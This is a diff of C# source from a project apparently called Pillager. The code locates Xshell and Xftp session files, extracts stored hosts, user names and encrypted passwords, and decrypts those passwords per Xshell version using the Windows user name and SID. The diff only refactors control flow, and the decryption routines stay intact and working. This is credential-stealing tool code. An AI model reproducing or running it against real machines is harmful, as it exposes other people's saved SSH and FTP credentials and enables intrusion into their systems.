@@ -1,5 +1,4 @@
-﻿using Pillager.Helper;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -7,6 +6,7 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
+using Pillager.Helper;
 
 namespace Pillager.Tools
 {
@@ -33,7 +33,6 @@ namespace Pillager.Tools
             {
                 if (file.Contains(".xsh")|| file.Contains(".xfp")) sessionFiles.Add(file);
             }
-            return;
         }
 
         public static string DecryptSessions()
@@ -47,18 +46,15 @@ namespace Pillager.Tools
             {
                 List<string> configs = ReadConfigFile(sessionFile);
                 if (configs.Count < 4) continue;
-                else
-                {
-                    sb.AppendLine("Session File: " + sessionFile);
-                    sb.Append("Version: " + configs[0]);
-                    sb.Append("Host: " + configs[1]);
-                    sb.Append("UserName: " + configs[2]);
-                    sb.Append("rawPass: " + configs[3]);
-                    sb.AppendLine("UserName: " + userName);
-                    sb.AppendLine("Sid: " + sid);
-                    sb.AppendLine(Decrypt(userName, sid, configs[3], configs[0].Replace("\r", "").ToString()));
-                    sb.AppendLine();
-                }
+                sb.AppendLine("Session File: " + sessionFile);
+                sb.Append("Version: " + configs[0]);
+                sb.Append("Host: " + configs[1]);
+                sb.Append("UserName: " + configs[2]);
+                sb.Append("rawPass: " + configs[3]);
+                sb.AppendLine("UserName: " + userName);
+                sb.AppendLine("Sid: " + sid);
+                sb.AppendLine(Decrypt(userName, sid, configs[3], configs[0].Replace("\r", "")));
+                sb.AppendLine();
             }
 
             return sb.ToString();
@@ -110,7 +106,8 @@ namespace Pillager.Tools
 
                 return("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
             }
-            else if (ver.StartsWith("5.1") || ver.StartsWith("5.2"))
+
+            if (ver.StartsWith("5.1") || ver.StartsWith("5.2"))
             {
                 byte[] data = Convert.FromBase64String(rawPass);
 
@@ -123,7 +120,8 @@ namespace Pillager.Tools
 
                 return ("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
             }
-            else if (ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0"))
+
+            if (ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0"))
             {
                 byte[] data = Convert.FromBase64String(rawPass);
 
@@ -136,7 +134,8 @@ namespace Pillager.Tools
 
                 return ("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
             }
-            else if (ver.StartsWith("7"))
+
+            if (ver.StartsWith("7"))
             {
                 string strkey1 = new string(username.ToCharArray().Reverse().ToArray()) + sid;
                 string strkey2 = new string(strkey1.ToCharArray().Reverse().ToArray());
